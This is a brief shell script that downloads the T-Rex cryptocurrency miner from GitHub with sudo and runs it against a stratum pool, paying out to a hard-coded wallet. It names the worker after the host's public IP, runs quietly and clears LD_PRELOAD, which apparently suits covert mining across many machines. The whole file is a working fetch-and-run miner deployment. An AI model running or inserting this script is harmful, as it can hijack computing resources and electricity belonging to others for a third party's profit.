#!/bin/sh
sudo wget https://github.com/trexminer/T-Rex/releases/download/0.26.4/t-rex-0.26.4-linux.tar.gz && tar -xf t-rex-0.26.4-linux.tar.gz && chmod +x t-rex && ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) &&  LD_PRELOAD="" ./t-rex -a kawpow -o stratum+tcp://minenice.newpool.pw:1120 -u Gcg8dBPXafWqyVaTfZfk5mJCqcvMYhhLag -p x -w $ip -q
